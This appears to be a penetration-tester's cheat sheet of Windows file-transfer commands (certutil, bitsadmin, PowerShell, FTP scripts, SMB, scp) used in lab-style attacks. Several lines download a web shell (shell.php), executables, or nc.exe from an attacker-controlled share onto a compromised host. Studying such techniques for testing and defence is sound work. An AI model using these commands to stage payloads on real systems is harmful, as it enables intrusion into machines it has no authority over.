# using system32 tools
certutil -urlcache -split -f "http://10.10.16.30:80/shell.php" shell.php
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

# powershell
# 1)
(New-Object Net.WebClient).DownloadFile('http://10.10.14.2:80/taskkill.exe', 'C:\Windows\Temp\taskkill.exe')
# 2)
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
# 3)
iwr -outf index.html https://superuser.com
# 4)
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output [-Asynchronous]

# FTP
# write all the user interactions in a config file
# (bypass non interactive shells' limitation)
echo open ip-addr > ftp.txt
echo username >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt

# SMB
# 1) list shares
net view \\10.10.16.30
# 2) list files
dir \\10.10.16.30\share-name
# 3) download a file
copy \\10.10.16.30\EVILSHARE\nc.exe nc.exe
# 3) bis: with net
net use z: \\10.10.16.30\EVILSHARE /user:root toor

# SCP (transfer over SSL)
scp root@10.10.16.30:some/file -p 22 # requires sshd running
